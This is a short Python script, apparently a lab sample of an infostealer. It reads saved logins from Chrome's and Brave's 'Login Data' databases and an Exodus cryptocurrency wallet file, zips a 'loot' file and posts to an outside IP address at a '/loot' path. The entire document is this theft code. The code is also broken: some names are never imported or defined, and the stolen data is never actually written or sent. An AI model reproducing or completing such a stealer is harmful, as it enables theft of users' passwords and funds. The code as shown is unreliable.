import os, zipfile
from ctypes import windll
blob = CryptUnprotectData(open(r"C:\Users\lab\AppData\Local\Google\Chrome\User Data\Default\Login Data","rb").read())
db = sqlite3.connect(r"C:\Users\lab\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data")
w = open(r"C:\Users\lab\AppData\Roaming\Exodus\exodus.wallet","rb").read()
with zipfile.ZipFile("loot.zip","w") as z: z.write("loot.txt")
import urllib.request; urllib.request.urlopen("http://198.51.100.24/loot", data=b"x")
